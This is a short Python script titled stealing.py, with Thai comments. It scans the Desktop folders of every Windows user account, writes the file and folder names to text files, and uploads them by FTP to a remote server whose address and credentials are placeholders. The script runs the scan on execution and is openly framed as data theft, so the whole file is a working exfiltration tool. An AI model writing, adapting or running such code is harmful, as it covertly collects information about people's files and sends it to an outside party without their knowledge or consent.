#stealing.py

import ftplib
import os


def steal(filename):
	ip = 'xx.xx.xx.xx' # FTP Server IP destination
	port = xxxx # Port FTP Server
	username = 'xxxxx'
	password = 'xxxxx'

	ftp = ftplib.FTP() # ประกาศ FTP
	ftp.connect(ip,port) # เชื่อมต่อ
	ftp.login(username,password)

	localpath = os.getcwd() #ตำแหน่ง folder ที่กำลัง run
	#print(localpath)

	mypath = '/PND69' #ชื่อ folder ตัวเอง

	ftp.cwd(mypath) # cwd : change working directory

	files = ftp.nlst() # ตรวจสอบ folder ว่ามี file อะไรบ้าง
	#print(files)
	print('BEFORE: ',files)
	
	filepath = os.path.join(localpath,filename)
	fileupload = open(filepath, 'rb')

	result  = ftp.storbinary('STOR ' + filename, fileupload) # 'STOR ' มี space หลังคำว่า STOR 1 เคาะ
	print(result)

	files = ftp.nlst() # ตรวจสอบ folder ว่ามี file อะไรบ้าง
	print('AFTER: ',files)
	ftp.close()

#steal('hello.txt')

def ScanDesktop(upload=False):
	folder_start = r'C:\Users'
	system_folder = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public']

	users_folder = os.listdir(folder_start)
	for u in users_folder:
		if u not in system_folder:
			try:
				userpath = os.path.join(folder_start,u)
				desktop = os.path.join(userpath,'Desktop')
				print(os.listdir(desktop))
				desktop_list = os.listdir(desktop)
				print('Desktop: ',desktop)
				for d in desktop_list:

					folder = os.path.join(desktop,d)
					filename = 'desktop-{}.txt'.format(u.replace(' ','-')) # desktop-uncle-engineer.txt
					# print(desktop+ '\\' + d)
					with open(filename,'a',encoding='utf-8') as file:
						t ='{}\n'.format(folder)
						file.write(t)
				
				steal(filename)

			except:
				pass

ScanDesktop()	
